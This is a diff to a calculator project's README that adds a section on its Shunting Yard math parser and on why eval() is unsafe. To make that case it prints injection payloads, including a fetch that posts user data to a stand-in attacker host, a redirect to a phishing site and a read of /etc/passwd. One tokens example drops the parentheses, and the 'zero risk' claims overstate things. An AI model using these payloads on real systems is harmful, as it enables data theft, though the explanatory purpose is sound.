@@ -85,6 +85,309 @@ gb-userstory1/
     └── package.json
 ```
 
+## 🧮 Mathematical Expression Parser
+
+### Overview
+
+The core of this calculator application is a custom-built mathematical expression parser that implements the **Shunting Yard algorithm**. This parser is responsible for correctly interpreting and evaluating mathematical expressions while respecting operator precedence and parentheses.
+
+### Why a Custom Parser?
+
+Instead of using JavaScript's `eval()` function (which poses serious security risks) or external math libraries, we implemented a custom parser that:
+
+- ✅ **Secure**: No code execution vulnerabilities
+- ✅ **Controlled**: Only supports specific mathematical operations
+- ✅ **Predictable**: Follows standard mathematical precedence rules
+- ✅ **Robust**: Comprehensive error handling and validation
+- ✅ **Educational**: Demonstrates computer science algorithms in practice
+
+### 🚨 Why `eval()` is Dangerous
+
+The `eval()` function is one of the most dangerous features in JavaScript and should **never** be used for processing user input. Here's why:
+
+#### 1. **Arbitrary Code Execution**
+`eval()` executes **any JavaScript code** passed to it, not just mathematical expressions:
+
+```javascript
+// DANGEROUS: eval() executes arbitrary code
+eval("2 + 3 * 4");           // ✅ Safe: Returns 14
+eval("alert('Hacked!')");     // ❌ Dangerous: Shows alert
+eval("document.body.innerHTML = '<h1>Hacked!</h1>'"); // ❌ DOM manipulation!
+eval("fetch('https://malicious-site.com/steal-data')"); // ❌ Data theft!
+```
+
+#### 2. **Code Injection Attacks**
+If user input reaches `eval()`, attackers can inject malicious code:
+
+```javascript
+// VULNERABLE CODE (NEVER DO THIS!)
+function calculate(expression) {
+    return eval(expression); // ❌ Extremely dangerous!
+}
+
+// Attack scenarios:
+calculate("2 + 3");                    // ✅ Looks innocent
+calculate("alert('XSS Attack!')");     // ❌ Executes arbitrary code
+calculate("localStorage.clear()");     // ❌ Could destroy user data
+calculate("location.href='https://malicious-site.com'"); // ❌ Redirects user
+```
+
+#### 3. **Access to Global Scope**
+`eval()` has access to the entire JavaScript execution context:
+
+```javascript
+// eval() can access/modify global variables and functions
+let secretApiKey = "abc123";
+eval("console.log(secretApiKey)"); // ❌ Could expose secrets
+eval("secretApiKey = 'stolen'");   // ❌ Could modify sensitive data
+eval("fetch('/api/admin/users')"); // ❌ Could access restricted APIs
+```
+
+#### 4. **No Input Validation**
+`eval()` doesn't distinguish between safe mathematical expressions and dangerous code:
+
+```javascript
+// These all execute with eval():
+eval("2 + 3");                    // ✅ Math
+eval("process.exit()");           // ❌ Could crash server
+eval("require('fs').readFileSync('/etc/passwd')"); // ❌ Could read system files
+eval("window.open('https://malware-site.com')");   // ❌ Could open malicious sites
+```
+
+#### 5. **Real-World Attack Examples**
+
+**Example 1: Calculator Hijacking**
+```javascript
+// User enters: "Math.random() < 0.5 ? 42 : location.href='https://phishing-site.com'"
+// Result: 50% chance of redirecting to malicious site
+```
+
+**Example 2: Data Exfiltration**
+```javascript
+// User enters: "fetch('/api/user-data').then(r=>r.json()).then(d=>fetch('https://attacker.com',{method:'POST',body:JSON.stringify(d)}))"
+// Result: Steals user data and sends to attacker's server
+```
+
+**Example 3: Session Hijacking**
+```javascript
+// User enters: "document.cookie = 'sessionId=hacked; path=/'"
+// Result: Could compromise user session
+```
+
+### 🛡️ How Our Custom Parser Prevents These Attacks
+
+#### 1. **Whitelist-Only Approach**
+Our parser only allows specific, safe characters:
+
+```javascript
+// Only these characters are allowed:
+const allowedPattern = /^[\d+\-*/().\s]+$/;
+// ✅ Digits: 0-9
+// ✅ Operators: +, -, *, /
+// ✅ Parentheses: (, )
+// ✅ Decimal point: .
+// ✅ Whitespace: space, tab, newline
+// ❌ Everything else is rejected
+```
+
+#### 2. **No Code Execution**
+The parser only processes mathematical tokens:
+
+```javascript
+// Our parser processes this:
+"2 + 3 * 4" → [2, '+', 3, '*', 4] → [2, 3, 4, '*', '+'] → 14
+
+// It CANNOT execute these attacks:
+"alert('hack')" → ❌ Error: "Invalid character: a"
+"fetch('/api')" → ❌ Error: "Invalid character: f"
+"document.body" → ❌ Error: "Invalid character: d"
+```
+
+#### 3. **Controlled Operations**
+Only predefined mathematical operations are supported:
+
+```javascript
+// ✅ Supported and safe:
+this.operators = {
+  '+': { precedence: 1, associativity: 'left' },
+  '-': { precedence: 1, associativity: 'left' },
+  '*': { precedence: 2, associativity: 'left' },
+  '/': { precedence: 2, associativity: 'left' }
+};
+
+// ❌ NOT supported (cannot be injected):
+// - Function calls (alert, fetch, etc.)
+// - Variable access (document, window, etc.)
+// - File system operations
+// - Network requests
+// - DOM manipulation
+// - Cookie/localStorage access
+```
+
+#### 4. **Security Comparison**
+
+| Method | Security Level | Input Validation | Code Execution Risk | Recommendation |
+|--------|---------------|------------------|-------------------|----------------|
+| `eval()` | ❌ None | ❌ None | 🚨 **Extremely High** | **Never use** |
+| `Function()` | ❌ None | ❌ None | 🚨 **Extremely High** | **Never use** |
+| Our Custom Parser | ✅ **Maximum** | ✅ **Comprehensive** | 🟢 **Zero** | ✅ **Recommended** |
+| Math Libraries | ✅ High | ✅ Good | 🟢 **Very Low** | ✅ Good alternative |
+
+#### 5. **Attack Prevention Examples**
+
+```javascript
+const parser = new MathParser();
+
+// ✅ Safe mathematical expressions work perfectly:
+parser.calculate("2 + 3 * 4");        // Returns: 14
+parser.calculate("(10 + 5) / 3");     // Returns: 5
+parser.calculate("100 - 25 * 2");     // Returns: 50
+
+// ❌ All attack attempts are blocked:
+parser.calculate("alert('hack')");     // Error: "Invalid character: a"
+parser.calculate("fetch('/api')");     // Error: "Invalid character: f"
+parser.calculate("document.write");    // Error: "Invalid character: d"
+parser.calculate("window.location");   // Error: "Invalid character: w"
+parser.calculate("eval('malicious')"); // Error: "Invalid character: e"
+parser.calculate("setTimeout(fn,0)");  // Error: "Invalid character: s"
+```
+
+This implementation ensures that **no malicious code can ever be executed**, making our calculator application completely secure against code injection attacks while maintaining full mathematical functionality.
+
+### The Shunting Yard Algorithm
+
+The **Shunting Yard algorithm**, invented by Dutch computer scientist Edsger Dijkstra in 1961, is a method for parsing mathematical expressions specified in infix notation and converting them to postfix notation (also known as Reverse Polish Notation or RPN).
+
+#### Why Shunting Yard?
+
+1. **Operator Precedence**: Automatically handles mathematical precedence rules (*, / before +, -)
+2. **Parentheses Support**: Correctly processes nested parentheses
+3. **Efficiency**: Linear time complexity O(n)
+4. **Reliability**: Well-established algorithm used in calculators and compilers
+5. **Clarity**: Clean separation between parsing and evaluation phases
+
+#### Algorithm Process
+
+The algorithm uses two main data structures:
+- **Output Queue**: Stores the final postfix expression
+- **Operator Stack**: Temporarily holds operators and parentheses
+
+#### Step-by-Step Example
+
+Let's trace through the expression: `2 + 3 * 4`
+
+**Input (Infix)**: `2 + 3 * 4`
+**Expected Output (Postfix)**: `2 3 4 * +`
+**Final Result**: `14`
+
+| Step | Token | Action | Output Queue | Operator Stack | Notes |
+|------|-------|--------|--------------|----------------|-------|
+| 1 | `2` | Number → Output | `[2]` | `[]` | Numbers go directly to output |
+| 2 | `+` | Operator → Stack | `[2]` | `[+]` | First operator goes to stack |
+| 3 | `3` | Number → Output | `[2, 3]` | `[+]` | Numbers go directly to output |
+| 4 | `*` | Operator → Stack | `[2, 3]` | `[+, *]` | * has higher precedence than +, so stack |
+| 5 | `4` | Number → Output | `[2, 3, 4]` | `[+, *]` | Numbers go directly to output |
+| 6 | End | Pop all operators | `[2, 3, 4, *, +]` | `[]` | Pop operators in reverse order |
+
+**Evaluation of Postfix**: `2 3 4 * +`
+1. Push `2` → Stack: `[2]`
+2. Push `3` → Stack: `[2, 3]`
+3. Push `4` → Stack: `[2, 3, 4]`
+4. Operator `*` → Pop `4` and `3`, compute `3 * 4 = 12`, push result → Stack: `[2, 12]`
+5. Operator `+` → Pop `12` and `2`, compute `2 + 12 = 14`, push result → Stack: `[14]`
+6. **Final Result**: `14`
+
+#### Implementation Architecture
+
+Our `MathParser` class implements the Shunting Yard algorithm in three main phases:
+
+```javascript
+// 1. TOKENIZATION: "2 + 3 * 4" → [2, '+', 3, '*', 4]
+const tokens = this.tokenize(expression);
+
+// 2. INFIX TO POSTFIX: [2, '+', 3, '*', 4] → [2, 3, 4, '*', '+']
+const postfix = this.infixToPostfix(tokens);
+
+// 3. EVALUATION: [2, 3, 4, '*', '+'] → 14
+const result = this.evaluatePostfix(postfix);
+```
+
+### Technical Implementation Details
+
+#### 1. Operator Configuration
+```javascript
+this.operators = {
+  '+': { precedence: 1, associativity: 'left' },
+  '-': { precedence: 1, associativity: 'left' },
+  '*': { precedence: 2, associativity: 'left' },
+  '/': { precedence: 2, associativity: 'left' }
+};
+```
+
+#### 2. Expression Validation
+- **Character Validation**: Only allows digits, operators, parentheses, decimal points, and whitespace
+- **Number Format Validation**: Prevents multiple decimal points (`2..3`)
+- **Structure Validation**: Ensures proper operator/operand arrangement
+
+#### 3. Tokenization Process
+- Parses character by character
+- Handles decimal numbers correctly
+- Validates number formats in real-time
+- Separates numbers, operators, and parentheses
+
+#### 4. Precedence Handling
+The algorithm correctly handles operator precedence:
+- **High Precedence (2)**: `*`, `/`
+- **Low Precedence (1)**: `+`, `-`
+- **Parentheses**: Override any precedence
+
+#### 5. Error Handling
+The parser provides specific error messages for common issues:
+
+| Error Type | Example | Error Message |
+|------------|---------|---------------|
+| Division by Zero | `5 / 0` | "Division by zero is not allowed" |
+| Invalid Characters | `2 & 3` | "Invalid character: &" |
+| Mismatched Parentheses | `(2 + 3` | "Mismatched parentheses" |
+| Invalid Number Format | `2..5` | "Invalid number format: 2..5" |
+| Empty Expression | ` ` | "Expression cannot be empty" |
+| Insufficient Operands | `+ 3` | "Invalid expression: insufficient operands" |
+
+### Performance Characteristics
+
+- **Time Complexity**: O(n) where n is the length of the expression
+- **Space Complexity**: O(n) for the output queue and operator stack
+- **Memory Efficient**: No recursive calls, uses iterative approach
+- **Predictable**: Same expression always produces same result
+
+### Algorithm Advantages
+
+1. **Mathematical Accuracy**: Follows standard mathematical precedence
+2. **Security**: No arbitrary code execution
+3. **Extensibility**: Easy to add new operators or functions
+4. **Debugging**: Clear separation between parsing and evaluation
+5. **Testing**: Each phase can be tested independently
+
+### Real-World Applications
+
+The Shunting Yard algorithm is used in:
+- 🖩 **Calculators**: Desktop and mobile calculator applications
+- 💻 **Compilers**: Programming language expression parsing
+- 📊 **Spreadsheets**: Formula evaluation in Excel, Google Sheets
+- 🎮 **Game Engines**: Mathematical expression systems
+- 🤖 **Programming Languages**: Expression evaluation engines
+
+### Example Calculations
+
+| Expression | Tokens | Postfix | Result | Notes |
+|------------|--------|---------|--------|-------|
+| `2 + 3` | `[2, '+', 3]` | `[2, 3, '+']` | `5` | Simple addition |
+| `2 * 3 + 4` | `[2, '*', 3, '+', 4]` | `[2, 3, '*', 4, '+']` | `10` | Multiplication first |
+| `(2 + 3) * 4` | `[2, '+', 3, '*', 4]` | `[2, 3, '+', 4, '*']` | `20` | Parentheses override |
+| `10 / 2 - 1` | `[10, '/', 2, '-', 1]` | `[10, 2, '/', 1, '-']` | `4` | Left-to-right evaluation |
+
+This implementation ensures that mathematical expressions are evaluated correctly, securely, and efficiently, providing a solid foundation for the calculator application.
+
 ## 🚀 Quick Start
 
 ### Prerequisites
@@ -375,7 +678,7 @@ These paths are configured in:
 - **Offline Detection**: Shows connection status
 
 ### Backend
-- **Mathematical Parser**: Custom implementation using Shunting Yard algorithm
+- **Mathematical Parser**: Custom implementation using Shunting Yard algorithm (see [Mathematical Expression Parser](#-mathematical-expression-parser) section for detailed explanation)
 - **Comprehensive Logging**: Request logging middleware
 - **Error Categories**: Detailed error codes for different failure types
 - **Rate Limiting**: Configurable request throttling
